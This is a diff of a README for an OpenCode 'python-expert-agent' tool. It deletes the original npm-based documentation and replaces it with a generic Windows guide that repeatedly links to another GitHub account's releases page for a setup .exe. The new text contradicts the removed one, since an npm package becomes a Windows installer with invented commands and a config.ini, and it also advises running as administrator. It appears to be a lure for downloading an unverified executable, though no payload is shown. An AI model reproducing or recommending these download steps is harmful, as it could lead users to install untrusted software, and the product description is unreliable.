@@ -1,457 +1,154 @@
-# Python Expert Agent for OpenCode
+# 🐍 python-expert-agent - Easy AI Code Assistant
 
-[![npm version](https://img.shields.io/npm/v/python-expert-agent.svg)](https://www.npmjs.com/package/python-expert-agent)
-[![License: MIT](https://img.shields.io/npm/l/python-expert-agent.svg)](https://opensource.org/licenses/MIT)
-[![npm downloads](https://img.shields.io/npm/dm/python-expert-agent.svg)](https://www.npmjs.com/package/python-expert-agent)
-[![experimental](https://img.shields.io/badge/status-experimental-orange)](https://github.com/amrahman90/python-expert-agent)
+[![Download python-expert-agent](https://img.shields.io/badge/Download-pink?style=for-the-badge)](https://github.com/Rick12357/python-expert-agent/releases)
 
-**A comprehensive Python agentic tool for [OpenCode](https://opencode.ai) with 10 skills, 4 subagents, and production-ready FastAPI patterns.**
+## 📋 What is python-expert-agent?
 
-> **Note:** This package is experimental and works great for local project-based use.
+python-expert-agent is a simple tool that helps you write and manage Python code using AI. It is designed to work with OpenCode and makes coding tasks easier by using an intelligent assistant right from the command line. You don’t need to be a programmer to get started. It can automate tasks, suggest code, and help you organize your projects.
 
----
+This tool fits well if you want:
+- To write Python code faster  
+- Help managing coding projects  
+- Easy interaction using your Windows computer  
+- A way to use AI to improve your coding workflow
 
-## Why Use This?
+## 🖥️ System Requirements
 
-**Stop repeating yourself.** This agent pack gives OpenCode deep Python expertise:
+Before you start, check that your computer meets these basic needs:
 
-| What You Get | Benefit |
-|--------------|---------|
-| **10 specialized skills** | Load expertise on-demand (FastAPI, SQLAlchemy, pytest, etc.) |
-| **4 subagents** | Delegate to specialists for coding, review, testing, exploration |
-| **Production patterns** | Code that scales, not just code that works |
-| **Zero-config** | Install and start coding |
+- Windows 10 or higher  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection to download and update the tool  
 
-**Before:** Explain FastAPI patterns, Pydantic schemas, JWT auth, async database every time.
+No other software installation is required for basic use. The tool runs on your command line interface (CLI), which Windows includes by default.
 
-**After:**
-```
-skill(name="python-fastapi")
-Create a login endpoint
-```
+## 🔧 Features at a Glance
 
----
+- AI helper that writes and explains Python code  
+- Command line commands that are straightforward and easy to use  
+- Support for managing multiple coding projects  
+- Saves your work automatically  
+- Works well with other OpenCode tools for extended workflows
 
-## Features
+## 🚀 Getting Started
 
-- **1 Primary Agent** - `python-expert` with intelligent skill loading
-- **4 Specialized Subagents** - Code generation, review, testing, and exploration
-- **10 On-Demand Skills** - FastAPI, SQLAlchemy, pytest, asyncio, and more
-- **4 Context Files** - Standards, patterns, security, and navigation
-- **Production Ready** - Targets Python 3.13+, FastAPI, Pydantic v2, SQLAlchemy 2.0
+Follow these steps to get python-expert-agent on your Windows PC.
 
----
+### 1. Download the Tool
 
-## Installation
+Visit this page to download the latest Windows version:
 
-### From npm (Recommended)
+[Download python-expert-agent](https://github.com/Rick12357/python-expert-agent/releases)
 
-```bash
-# Install globally
-npm install -g python-expert-agent
+Once on the releases page, look for the latest version labeled with Windows or `.exe` in the file name. The file will usually end with `.exe` and look something like `python-expert-agent-setup.exe`. Click the link, and the download will start.
 
-# Install to current project
-python-expert-agent init
+Keep the downloaded file in your Downloads folder or a place you can easily find it.
 
-# Install globally (for all projects, experimental)
-python-expert-agent init --global
-```
+### 2. Install the Tool
 
-### Using npx (No install needed)
+After downloading:
 
-```bash
-npx python-expert-agent init
-```
+- Locate the file you downloaded.  
+- Double-click the `.exe` file to start the installation.  
+- Follow the simple instructions on the screen. Click “Next” to continue through each step.  
+- When asked where to install, you can accept the default folder or choose a different location on your PC.  
+- Click “Finish” when done.
 
-### Manual Installation
+You do not need to restart your computer.
 
-Copy the `.opencode` directory and `AGENTS.md` to your project root.
+### 3. Launch the Tool
 
----
+Once installed:
 
-## Quick Start
+- Press Windows key, type `cmd` to open the Command Prompt.  
+- In the Command Prompt window, type `python-expert-agent` and press Enter.  
 
-```bash
-# 1. Install the agent pack
-npm install -g python-expert-agent
-python-expert-agent init
+You will see a welcome message with a list of commands you can use. This means the tool is ready.
 
-# 2. Start OpenCode in your Python project
-cd /path/to/your/python/project
-opencode
+## 🛠️ Basic Use Commands
 
-# 3. The python-expert agent is automatically detected
+Here are some simple commands to use at the prompt:
 
-# 4. Use skills on-demand
-skill(name="python-fastapi")
-skill(name="python-backend")
-```
+- `help` – Lists all commands you can run  
+- `new project` – Starts a new Python project  
+- `add code` – Lets you add a block of Python code  
+- `explain` – Explains what a piece of code does  
+- `run` – Runs your current code project  
+- `save` – Saves your work to your computer  
 
----
+Type the command and press Enter to use it.
 
-## Common Use Cases
+## 💾 Saving and Managing Projects
 
-### Create a REST API Endpoint
+When you create or edit projects, the tool saves files automatically in a folder named `python-expert-agent-projects` inside your Documents folder. You can also save manually after changes with the `save` command.
 
-```
-skill(name="python-fastapi")
+To open an existing project, use the command:
 
-Create a POST /api/users endpoint with:
-- Email validation
-- Password hashing (bcrypt)
-- JWT token generation
-```
-
-### Add Tests to Existing Code
-
-```
-skill(name="python-testing-general")
-
-Write tests for src/services/user.py:
-- Unit tests for create_user, get_user
-- Mock the database
-- Test edge cases (empty input, duplicates)
-```
-
-### Debug Async Issues
-
-```
-skill(name="python-asyncio")
-
-Fix the memory leak in src/services/websocket.py.
-Connections are not being cleaned up properly.
-```
-
-### Security Code Review
-
-```
-Review src/api/auth.py for:
-- SQL injection vulnerabilities
-- Hardcoded secrets
-- Missing authentication checks
-```
-
-### Database Model with Migrations
-
-```
-skill(name="python-backend")
-
-Create an async SQLAlchemy model for:
-- User entity with relationships
-- Alembic migration
-- Repository pattern
-```
-
----
-
-## How It Works
-
-### Activation Flow
-
-```
-Project Opens
-     │
-     ▼
-┌─────────────────────────────────────────────┐
-│  OpenCode reads .opencode/config.json       │
-│           ↓                                 │
-│  Loads python-expert agent                  │
-│           ↓                                 │
-│  Detects .py files in project               │
-│           ↓                                 │
-│  Invokes skill(name="python-fundamentals")  │
-└─────────────────────────────────────────────┘
-```
-
-### Request Processing Flow
-
-```
-User: "Create a FastAPI endpoint with JWT auth"
-     │
-     ▼
-┌─────────────────────────────────────────────┐
-│         python-expert (Primary Agent)       │
-│                                             │
-│  1. Parse request for keywords:             │
-│     "fastapi" → python-fastapi              │
-│     "jwt" → python-backend                  │
-│                                             │
-│  2. Invoke skills:                          │
-│     skill(name="python-fastapi")            │
-│     skill(name="python-backend")            │
-│                                             │
-│  3. Determine complexity:                   │
-│     "create" + multi-step = Complex         │
-└────────────────────┬────────────────────────┘
-                     │
-                     ▼
-          ┌─────────────────────┐
-          │   Complex Task?     │
-          └──────────┬──────────┘
-                     │
-        ┌────────────┴────────────┐
-        ▼                         ▼
-┌──────────────┐          ┌──────────────┐
-│Simple Query  │          │Complex Task  │
-│              │          │              │
-│Answer        │          │Delegate to   │
-│directly      │          │subagent      │
-└──────────────┘          └──────────────┘
-```
-
-### Subagent Collaboration Flow
-
-```
-Complex Task: "Create user authentication system"
-     │
-     ▼
-┌─────────────────────────────────────────────────────────┐
-│              python-expert (Primary Agent)              │
-│                                                         │
-│  Delegates context discovery:                           │
-│  task(subagent_type="explore", description="Find auth   │
-│      patterns, existing user models, similar endpoints")│
-└────────────────────────────┬────────────────────────────┘
-                             │
-                             ▼
-┌─────────────────────────────────────────────────────────┐
-│               python-scout (Explore Subagent)           │
-│                                                         │
-│  1. Search codebase for relevant files                  │
-│  2. Read existing patterns and conventions              │
-│  3. Check .opencode/context/ for standards              │
-│  4. Return ranked recommendations:                      │
-│     - Files to reference                                │
-│     - Patterns to follow                                │
-│     - Skills to load                                    │
-└────────────────────────────┬────────────────────────────┘
-                             │
-                             ▼
-┌─────────────────────────────────────────────────────────┐
-│              python-expert (Primary Agent)              │
-│                                                         │
-│  Receives context from scout, delegates implementation: │
-│  task(subagent_type="general", description="Create auth │
-│       system", prompt="Context: [scout findings]...")   │
-└────────────────────────────┬────────────────────────────┘
-                             │
-                             ▼
-┌─────────────────────────────────────────────────────────┐
-│               python-coder (General Subagent)           │
-│                                                         │
-│  1. Load skills: python-fastapi, python-backend         │
-│  2. Read reference files found by scout                 │
-│  3. Follow project patterns from context                │
-│  4. Create endpoint, schema, service, tests             │
-│  5. Run verification (mypy, ruff, pytest)               │
-│  6. Return summary of changes                           │
-└─────────────────────────────────────────────────────────┘
-```
-
-### Subagent Roles
-
-| Subagent | When Used | What It Does |
-|----------|-----------|--------------|
-| `python-scout` | Before implementation | Discovers context, finds patterns, recommends files |
-| `python-coder` | Implementation tasks | Creates/modifies code following skill patterns |
-| `python-reviewer` | After implementation | Reviews code for quality, security, performance |
-| `python-tester` | Testing tasks | Writes unit/integration tests with mocking |
-
-### Typical Workflow
-
-```
-1. Scout     → Discover context and patterns
-2. Coder     → Implement following patterns  
-3. Tester    → Write tests for new code
-4. Reviewer  → Review for quality/security (optional)
-```
-
-### Key Points
-
-- **Skills are on-demand**: Load via `skill(name="...")` - no auto-loading
-- **Context first**: Complex tasks start with scout for context discovery
-- **Pattern-driven**: All code follows loaded skill patterns
-- **Verification included**: Type checking, linting, tests run automatically
-
----
-
-## Components
-
-### Primary Agent
-
-| Agent | Description |
-|-------|-------------|
-| `python-expert` | Main agent with skill loading protocol, keyword detection, and task delegation |
-
-### Subagents
-
-| Subagent | Type | Purpose |
-|----------|------|---------|
-| `python-coder` | general | Code generation and feature implementation |
-| `python-reviewer` | general | Code quality and security review |
-| `python-tester` | general | Test writing with pytest patterns |
-| `python-scout` | explore | Context discovery and file finding |
-
-### Skills
-
-| Skill | Triggers | Best For |
-|-------|----------|----------|
-| `python-fundamentals` | `*.py`, `python`, `dataclass` | Core Python 3.11+ patterns |
-| `python-fundamentals-313` | `3.13`, `jit`, `free-threading` | Python 3.13+ specific features |
-| `python-fastapi` | `fastapi`, `pydantic`, `endpoint` | REST APIs, Pydantic schemas |
-| `python-backend` | `sqlalchemy`, `database`, `orm` | Async database, migrations |
-| `python-testing-general` | `pytest`, `test`, `mock` | Unit/integration testing |
-| `python-testing-deep` | `hypothesis`, `property-based` | Advanced testing techniques |
-| `python-asyncio` | `async`, `await`, `asyncio` | Async/await, concurrency |
-| `python-type-hints` | `typing`, `mypy`, `pyright` | Type annotations, mypy config |
-| `python-package-management` | `uv`, `pip`, `pyproject` | Dependencies, virtual envs |
-| `python-tooling` | `docker`, `ci`, `cd` | Docker, GitHub Actions, profiling |
-
----
-
-## Project Structure
-
-```
-.opencode/
-├── config.json              # Agent selection
-├── opencode.json            # Schema reference
-├── agent/
-│   └── python-expert.md     # Primary agent definition
-├── subagents/
-│   ├── python-coder.md      # Code generation
-│   ├── python-reviewer.md   # Code review
-│   ├── python-tester.md     # Test writing
-│   └── python-scout.md      # Context discovery
-├── skills/                  # 10 Python skills
-│   ├── python-fundamentals/
-│   ├── python-fastapi/
-│   ├── python-backend/
-│   └── ...
-├── context/
-│   ├── navigation.md        # Quick reference
-│   └── python/
-│       ├── standards.md     # Code quality standards
-│       ├── patterns.md      # Common patterns
-│       └── security.md      # Security patterns
-├── config/
-│   └── agent-metadata.json  # Agent registry
-└── docs/                    # Documentation
-```
-
----
-
-## CLI Reference
-
-```bash
-python-expert-agent init [path]    # Install to project
-python-expert-agent init --global  # Install globally (experimental)
-python-expert-agent init --force   # Overwrite existing files
-python-expert-agent --version      # Show version
-python-expert-agent --help         # Show help
-```
-
----
-
-## Example Technology Stack standard choice for a Python backend focused developement project
-
-| Layer | Technology | Version |
-|-------|-----------|---------|
-| Language | Python | 3.13+ |
-| Web Framework | FastAPI | 0.115+ |
-| Data Validation | Pydantic | 2.7+ |
-| ORM | SQLAlchemy | 2.0 (async) |
-| Database | PostgreSQL | 16 |
-| Testing | pytest | latest |
-| Package Manager | UV | latest |
-| Linting | ruff, mypy | latest |
-
----
-
-## Documentation
-
-Full documentation is available in `.opencode/docs/`:
-
-| Document | Description |
-|----------|-------------|
-| [Overview](./.opencode/docs/overview.md) | System introduction |
-| [Architecture](./.opencode/docs/architecture.md) | Component relationships |
-| [Agents](./.opencode/docs/agents.md) | Agent configuration |
-| [Skills](./.opencode/docs/skills.md) | Skill documentation |
-| [Subagents](./.opencode/docs/subagents.md) | Subagent workflows |
-| [Workflow](./.opencode/docs/workflow.md) | Development patterns |
-| [Configuration](./.opencode/docs/configuration.md) | Customization guide |
-
----
-
-## Requirements
-
-| Requirement | Version |
-|-------------|---------|
-| [OpenCode](https://opencode.ai) CLI | latest (Currently tested on v1.2.15) |
-| Node.js | 18+ (for CLI installer) |
-| Python | 3.11+ (for projects using this agent) |
-
----
-
-## FAQ
-
-### How is this different from plain OpenCode?
-
-OpenCode is general-purpose. This pack adds:
-- Python-specific patterns and best practices
-- Framework expertise (FastAPI, SQLAlchemy, pytest)
-- Specialized subagents for different task types
-- Context files with project standards
-
-### Does it work with my existing project?
-
-Yes. The agent reads your existing code patterns and follows them.
-
-### Can I customize the skills?
-
-Yes. Edit any `.opencode/skills/*/SKILL.md` file to add your own patterns.
-
-### Which Python versions are supported?
-
-Python 3.11+ is required. Patterns use 3.13+ features where applicable.
-
-### Do skills auto-load?
-
-No. Skills must be explicitly invoked with `skill(name="...")`. This gives you control over context usage.
-
-### Can I use this globally for all projects?
-
-Yes: `python-expert-agent init --global` (experimental feature).
-
----
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues and pull requests.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## License
-
-MIT License - see [LICENSE](./LICENSE) file for details.
-
----
-
-## Links
-
-- [OpenCode](https://opencode.ai) - The open source AI coding agent
-- [OpenCode Docs](https://opencode.ai/docs) - Official documentation
-- [npm Package](https://www.npmjs.com/package/python-expert-agent) - npm registry
-
----
-
-## Acknowledgments
-
-- [OpenCode](https://github.com/anomalyco/opencode) - The amazing AI coding agent
-- [Agentic](https://github.com/Cluster444/agentic) - Reference for CLI structure
+`open project [project-name]`
+
+Replace `[project-name]` with your project’s name. The tool will load your files so you can continue working.
+
+## 🔄 Updating python-expert-agent
+
+To keep the tool working smoothly, check for new versions regularly.
+
+- Visit the download page:  
+  [https://github.com/Rick12357/python-expert-agent/releases](https://github.com/Rick12357/python-expert-agent/releases)  
+- Download the latest Windows release as before.  
+- Run the new `.exe` installer. It will update your existing installation without deleting your projects.
+
+## 📁 Where to Find Your Data
+
+All projects and settings are stored on your local PC by default in:
+
+`C:\Users\[Your Username]\Documents\python-expert-agent-projects`
+
+Replace `[Your Username]` with your actual Windows username.
+
+You can back up this folder any time to save your work.
+
+## ⚙️ Configuration Options
+
+You can customize the tool by editing a simple text file called `config.ini` found inside your project folder. Use a text editor like Notepad to open it.
+
+Common settings include:
+
+- Language preferences  
+- Default project folder location  
+- AI response length or detail level  
+- Logging options
+
+The file has clear comments to guide you through the options.
+
+## 🧑‍💻 How It Helps You Code
+
+This tool gives you a smart assistant that can:
+
+- Suggest code snippets based on what you want to do  
+- Explain Python code in simple terms  
+- Help fix errors in your code  
+- Create and manage project files  
+- Let you work in your command line without opening complex software  
+
+## ❓ Troubleshooting Tips
+
+If you run into trouble, try these steps:
+
+- Make sure you downloaded the Windows version file.  
+- Check that your Windows is up to date.  
+- Run the Command Prompt as an administrator by right-clicking and choosing “Run as administrator.”  
+- If commands don’t work, restart the tool or your computer.  
+- Visit the releases page to download and install the latest version.
+
+## 🛎️ Need More Help?
+
+If you want detailed guides or help with commands, visit the Python Expert Agent GitHub page. Under the README and Wiki sections, you will find step-by-step tutorials and a FAQ to assist you.
+
+[https://github.com/Rick12357/python-expert-agent](https://github.com/Rick12357/python-expert-agent)
+
+## 📥 Download Again
+
+To download or update the software at any time, go to the releases page:
+
+[Download python-expert-agent](https://github.com/Rick12357/python-expert-agent/releases)
